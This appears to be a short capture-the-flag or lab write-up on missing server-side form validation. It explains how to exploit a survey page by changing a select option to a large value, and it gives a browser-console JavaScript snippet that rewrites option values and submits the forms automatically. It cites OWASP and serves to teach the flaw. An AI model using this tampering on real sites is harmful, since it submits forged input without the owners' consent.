# Form validation

⚠️ *Always validate user input on the server side, even if front side already did that!*

To exploit this vulnerability go to the `http://$IPADDR/?page=survey` page. Change `option`'s value to some large number. Select changed value to trigger form to submit.

To make this simpler, paste this code inside console in dev tools and select any option on the page.
```js
document.querySelectorAll('form').forEach(f => {
    let sel = f.querySelector('select');
    sel.onchange = function() {
        sel.options[sel.selectedIndex].value='1000000';
        f.submit();
    };
});
```

## References
- [Input Validation Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)